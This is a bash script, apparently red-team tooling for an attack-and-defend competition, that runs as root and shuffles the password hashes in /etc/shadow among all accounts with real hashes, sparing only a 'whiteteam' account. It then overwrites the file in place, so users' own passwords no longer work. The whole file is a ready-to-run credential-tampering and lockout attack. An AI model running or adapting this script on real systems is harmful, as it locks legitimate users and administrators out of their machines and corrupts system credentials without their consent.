#!/usr/bin/env bash
set -euo pipefail

# Username to exclude from shuffling
excluded_user="whiteteam"

input="${1:-/etc/shadow}"

# Validate we’re root (required to modify /etc/shadow)
if [[ "$EUID" -ne 0 ]]; then
    echo "Error: Must be run as root (to modify $input)" >&2
    exit 1
fi

# Get file metadata safely
orig_owner_uid=$(stat -c '%u' -- "$input")
orig_owner_gid=$(stat -c '%g' -- "$input")
orig_mode=$(stat -c '%a' -- "$input")

orig_dir="$(dirname -- "$input")"
orig_base="$(basename -- "$input")"

# mktemp usage compatible with Ubuntu
tmp="$(mktemp "${orig_dir}/${orig_base}.tmp.XXXXXX")"
trap 'rm -f -- "$tmp"' EXIT

declare -a lines usernames hashes restparts is_real_indices

# Read file lines safely
while IFS= read -r line || [[ -n "$line" ]]; do
    lines+=("$line")
done < "$input"

# Parse each line
for i in "${!lines[@]}"; do
    line="${lines[i]}"

    # Skip empty or comment lines
    if [[ -z "$line" || "${line:0:1}" == "#" ]]; then
        usernames[i]="" ; hashes[i]="" ; restparts[i]=""
        continue
    fi

    IFS=':' read -r user pass rest <<< "$line" || true
    usernames[i]="$user"
    hashes[i]="$pass"
    restparts[i]="${line#${user}:${pass}:}"

    # Exclude specific username
    if [[ "$user" == "$excluded_user" ]]; then
        continue
    fi

    # Identify "real" accounts (those with real hashes)
    if [[ -n "$pass" && "$pass" != "*" && "$pass" != "!" && "$pass" != "!!" && "${pass:0:1}" != "!" ]]; then
        is_real_indices+=("$i")
    fi
done

# If there are fewer than 2 accounts, skip shuffle
if (( ${#is_real_indices[@]} < 2 )); then
    echo "Less than 2 real accounts found (excluding '$excluded_user'); nothing to shuffle." >&2
    rm -f -- "$tmp"
    trap - EXIT
    exit 0
fi

# Shuffle the password hashes among real accounts
real_hashes=()
for idx in "${is_real_indices[@]}"; do
    real_hashes+=("${hashes[idx]}")
done

mapfile -t shuffled_hashes < <(printf '%s\n' "${real_hashes[@]}" | shuf)

for k in "${!is_real_indices[@]}"; do
    idx="${is_real_indices[k]}"
    hashes[idx]="${shuffled_hashes[k]}"
done

# Write back to temporary file
{
    for i in "${!lines[@]}"; do
        if [[ -z "${usernames[i]}" && -z "${restparts[i]}" && -z "${hashes[i]}" ]]; then
            printf '%s\n' "${lines[i]}"
            continue
        fi

        if [[ -n "${restparts[i]}" ]]; then
            printf '%s:%s:%s\n' "${usernames[i]}" "${hashes[i]}" "${restparts[i]}"
        else
            printf '%s:%s\n' "${usernames[i]}" "${hashes[i]}"
        fi
    done
} > "$tmp"

# Restore file permissions and ownership (Ubuntu-safe)
chmod "$orig_mode" "$tmp"
chown "$orig_owner_uid:$orig_owner_gid" "$tmp" 2>/dev/null || true

# Atomically replace the original file
mv -f -- "$tmp" "$input"

trap - EXIT

echo "Overwrote: $input"
echo "Real accounts shuffled (excluding '$excluded_user'): ${#is_real_indices[@]}"
